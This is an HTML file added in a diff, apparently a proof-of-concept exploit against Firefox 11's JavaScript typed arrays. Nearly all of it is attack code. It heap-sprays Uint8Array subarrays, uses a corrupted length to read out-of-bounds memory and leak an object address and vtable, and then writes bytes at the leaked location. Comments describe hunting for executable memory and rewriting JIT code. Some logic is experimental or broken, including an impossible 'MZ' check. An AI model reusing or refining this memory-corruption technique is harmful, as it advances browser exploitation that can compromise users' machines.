@@ -1,0 +1,108 @@
+<!doctype html>
+
+<body></body>
+
+<script>
+
+//s -d 0 L?0x0FFFFFFF 0x4f434544
+//#.load pykd.pyd; !py u8a
+
+var SPRAY_LVL = 0x8;
+
+function UsignedXWORD(a)
+{
+	return (a << 1) >>> 1;
+}
+
+function EndianToXWORD(aBuff, pos, size)
+{
+	var xword = 0;
+	
+	for (var i = 0; i < size; i++)
+		xword = (xword << 8) | aBuff[pos + (size - 1) - i];
+	return xword;
+}
+
+//FF11! : mozjs!js::ArrayBuffer::obj_lookupProperty
+function LeakSomeVtable(explorer, pos)
+{
+	var poi = EndianToXWORD(explorer, 0x70, 4);
+	var ind = UsignedXWORD(poi - pos);
+	
+	poi = EndianToXWORD(explorer, ind, 4);
+	ind = UsignedXWORD(poi - pos);
+	
+	poi = EndianToXWORD(explorer, ind, 4);
+
+	//ind = UsignedXWORD(poi - pos);		
+	//poi = EndianToXWORD(explorer, ind + 0x60, 4);	
+	return poi;			
+}
+
+//in FIREFOX (v11) : 
+//&ui8a - 0x14 == &ui8a! 0x90 bytes header ==> 
+var pupet = new Uint8Array([0x44, 0x45, 0x43, 0x4f, 0x59]);
+//==> *(&ui8a.data + 0x7C) - 0x90 == &ui8a ;)
+var pupet_position_leak =  new Uint8Array([0x44, 0x45, 0x43, 0x4f, 0x59]);
+
+var hspray = new Array();
+for (var i = 0; i < SPRAY_LVL; i++)
+	hspray[i] = pupet.subarray(0, 2);
+	
+alert("alter size ...");
+
+for (var i = 0; i < hspray.length; i++)
+{
+	if (hspray[i].length != 2)
+	{
+		var img_addr = EndianToXWORD(hspray[i], 0x7c, 4);
+		var pos = img_addr - 0x90;
+				
+		alert("position info : " + pos.toString(0x10) + " " + hspray[i].length);
+				
+//Perform leak : get some VTable
+		var leak = LeakSomeVtable(hspray[i], pos);
+		alert(leak.toString(0x10));
+				
+//Patch everithing : how easy is to write own ptr's ?
+		var ind = UsignedXWORD(leak - pos);
+		for (var j = 0; j < 0x10; j++)
+			hspray[i][ind + j] = j;
+			
+//Epic! : perform little experimantal search
+		for (var j = 0x90; j < UsignedXWORD(hspray[i].length); j++)
+		{
+			if (hspray[i][j] == 0x4d && hspray[i][j] == 0x5a)
+			{
+				alert("image found, target import / export table! "
+						+ (pos + j).toString(0x10));
+			}
+		}
+		//OLA! exception raised, but check address this code in .asm : RWE!
+		//next goal ? ==> locate our .js code in .asm in memory, and rewrite it ;)
+		//position of UInt8Array should to be at lower address at .js->.asm ? .. locate & patch ..
+	}	
+}
+
+alert("finished");
+
+</script>
+
+</html>
+
+<!--
+//or obtain uint8array from canvas ;)
+<!doctype html>
+
+<body id="bodi">
+<canvas id="canvas1" width="1", height="1"></canvas>
+<canvas id="canvas2" width="1", height="1"></canvas>
+</body>
+<script>
+var a = document.getElementById("canvas1").getContext("2d").
+        getImageData(0, 0, 1, 1).data.subarray(0, 4);
+var b = document.getElementById("canvas2").getContext("2d").
+        getImageData(0, 0, 1, 1).data.subarray(0, a.length);
+
+</script>
+-->
